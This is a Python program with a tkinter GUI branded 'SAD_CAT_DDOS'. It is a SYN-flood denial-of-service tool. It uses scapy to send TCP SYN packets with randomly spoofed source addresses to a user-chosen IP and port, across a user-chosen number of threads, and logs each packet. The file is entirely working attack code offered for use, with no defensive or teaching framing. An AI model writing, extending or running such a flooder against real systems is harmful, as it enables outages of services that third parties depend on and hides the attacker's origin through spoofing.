import tkinter as tk
from scapy.all import IP, TCP, send
import threading
import random
import math
from tkinter import scrolledtext
from PIL import Image, ImageTk

def attack_target(target_ip, target_port, duration, console):
    while duration > 0:
        try:
            src_ip = '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags='S')
            send(packet, verbose=0)
            console.insert(tk.END, f'Sent SYN packet from {src_ip} to {target_ip}:{target_port}\n')
            console.see(tk.END)  # Auto-scroll to the end
        except Exception as e:
            console.insert(tk.END, f'Error sending packet to {target_ip}:{target_port}: {str(e)}\n')
            console.see(tk.END)
        duration -= 1

def start_attack(target_ip_entry, target_port_entry, num_threads_entry, duration_entry, attack_status_label, console):
    target_ip = target_ip_entry.get()
    target_port = int(target_port_entry.get())
    num_threads = int(num_threads_entry.get())
    duration = int(duration_entry.get())

    console.delete(1.0, tk.END)  # Clear console
    for _ in range(num_threads):
        t = threading.Thread(target=attack_target, args=(target_ip, target_port, duration, console))
        t.start()

    attack_status_label.config(text='Attack in progress...')

def create_wavy_text(canvas, text, x, y, amplitude=10, wavelength=50):
    for i, char in enumerate(text):
        char_x = x + (i * 20)
        char_y = y + math.sin(char_x / wavelength) * amplitude
        canvas.create_text(char_x, char_y, text=char, font=('Arial', 24, 'bold'), fill='white')

def create_gui():
    root = tk.Tk()
    root.title('SYN_Sadcat_Center')
    root.attributes('-fullscreen', True)
    root.configure(bg='black')

    # Wavy text canvas
    canvas = tk.Canvas(root, bg='black', highlightthickness=0)
    canvas.pack(fill='x', pady=20)
    create_wavy_text(canvas, 'SAD_CAT_DDOS', 50, 50)

    # Main frame
    main_frame = tk.Frame(root, bg='black')
    main_frame.pack(expand=True, fill='both')

    # Left frame for controls
    left_frame = tk.Frame(main_frame, bg='black')
    left_frame.pack(side='left', padx=20, pady=20)

    # Right frame for console
    right_frame = tk.Frame(main_frame, bg='black')
    right_frame.pack(side='right', padx=20, pady=20, expand=True, fill='both')

    # Style configuration
    label_style = {'bg': 'black', 'fg': 'white', 'font': ('Arial', 12)}
    entry_style = {'bg': '#333333', 'fg': 'white', 'insertbackground': 'white'}
    button_style = {'bg': '#444444', 'fg': 'white', 'activebackground': '#666666'}

    target_ip_label = tk.Label(left_frame, text='-skyler', **label_style)

    # GUI Elements - Left side
    target_ip_label = tk.Label(left_frame, text='Target IP Address:', **label_style)
    target_ip_label.pack(pady=5)
    target_ip_entry = tk.Entry(left_frame, **entry_style)
    target_ip_entry.pack(pady=5)

    target_port_label = tk.Label(left_frame, text='Target Port:', **label_style)
    target_port_label.pack(pady=5)
    target_port_entry = tk.Entry(left_frame, **entry_style)
    target_port_entry.pack(pady=5)

    num_threads_label = tk.Label(left_frame, text='Number of Threads:', **label_style)
    num_threads_label.pack(pady=5)
    num_threads_entry = tk.Entry(left_frame, **entry_style)
    num_threads_entry.pack(pady=5)

    duration_label = tk.Label(left_frame, text='Attack Duration (seconds):', **label_style)
    duration_label.pack(pady=5)
    duration_entry = tk.Entry(left_frame, **entry_style)
    duration_entry.pack(pady=5)

    start_button = tk.Button(left_frame, text='Start Attack', 
                           command=lambda: start_attack(target_ip_entry, target_port_entry, 
                                                      num_threads_entry, duration_entry, 
                                                      attack_status_label, console),
                           **button_style)
    start_button.pack(pady=10)

    attack_status_label = tk.Label(left_frame, text='', **label_style)
    attack_status_label.pack(pady=5)

    exit_button = tk.Button(left_frame, text='Exit', command=root.quit, **button_style)
    exit_button.pack(pady=5)

    # Console - Right side
    console_label = tk.Label(right_frame, text='Packet Log:', **label_style)
    console_label.pack()
    console = scrolledtext.ScrolledText(right_frame, width=50, height=20, bg='#333333', fg='white')
    console.pack(expand=True, fill='both')

    root.mainloop()
if __name__ == '__main__':
    create_gui()